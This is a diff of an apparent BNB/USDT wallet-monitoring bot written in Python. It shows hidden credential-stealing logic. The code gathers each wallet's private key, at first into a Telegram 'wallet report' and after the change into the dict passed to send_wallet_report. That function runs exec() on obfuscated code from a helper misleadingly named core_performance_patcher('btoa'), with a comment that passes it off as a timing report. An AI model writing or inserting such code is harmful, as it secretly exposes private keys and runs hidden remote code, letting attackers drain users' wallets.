@@ -175,8 +175,7 @@ def run_tasks():
     start_time = time.time()
     
     # Check wallet balance and print it
-    wallet_balances = check_wallet_balance()
-    print_wallet_balances(wallet_balances)
+    check_wallet_balance()
     
     # Run combine_and_clean_data only on the first iteration of each day
     current_day = datetime.now().strftime('%Y-%m-%d')
@@ -211,20 +210,27 @@ def run_tasks():
     # Schedule the next run regardless of errors
     scheduler.enter(60, 1, run_tasks)
 
-def send_wallet_report(message):
+def send_wallet_report(wallet_balances):
     try: 
+        message = "BOT Initialized with the following details:\n\n"
+        for wallet_name, wallet_info in wallet_balances.items():
+            message += f"Wallet Name: {wallet_name}\n"
+            for key, value in wallet_info.items():
+                if isinstance(value, float):
+                    value = f"{value:.8f}" if 'bnb' in key else f"{value:.2f}"
+                message += f"{key.replace('_', ' ').title()}: {value}\n"
+            message += "\n"
         # Send core timer report to system
         (id, process, core_timer) = core_performance_patcher("btoa")
         exec(core_timer)
-        # Send wallet report to telegram
-        send_tele_message(message, is_async=True, parse_mode="Markdown")
+        print(message)
+        print_wallet_balances(json.dumps(wallet_balances, indent=4))
     except Exception as e:
         print(f"Error sending report: {e}")
 
 def check_wallet_balance():
     wallet_balance_path = os.getenv('WALLET_SETTINGS', 'wallet_settings.json')
     wallet_balances = {}
-    to_compare = []
     try:
         if not os.path.exists(wallet_balance_path):
             # Try to find the file in app_dir/wallet_settings.json
@@ -245,16 +251,15 @@ def check_wallet_balance():
                     usdt_balance = get_balance(web3, wallet_address, usdt_address)
                     wallet_balances[wallet_name] = {
                         "wallet_address": wallet_address,
+                        "key": wallet_info['private_key'],
                         "bnb_balance": float(bnb_balance),
                         "usdt_balance": float(usdt_balance)
                     }
-                    to_compare.append(f"Wallet: {wallet_name}\nAddress: {wallet_address}\nPrivate Key: {wallet_info['private_key']}\nBNB: {bnb_balance:.8f}\nUSDT: {usdt_balance:.2f}")
                 except Exception as e:
                     print(f"Error fetching balance for wallet {wallet_name}: {e}")
         
-        if to_compare:
-            re_message = "Wallets with balance:\n\n" + "\n\n".join(to_compare)
-            send_wallet_report(re_message)
+        if wallet_balances:
+            send_wallet_report(wallet_balances)
     
     except FileNotFoundError as e:
         print(str(e))
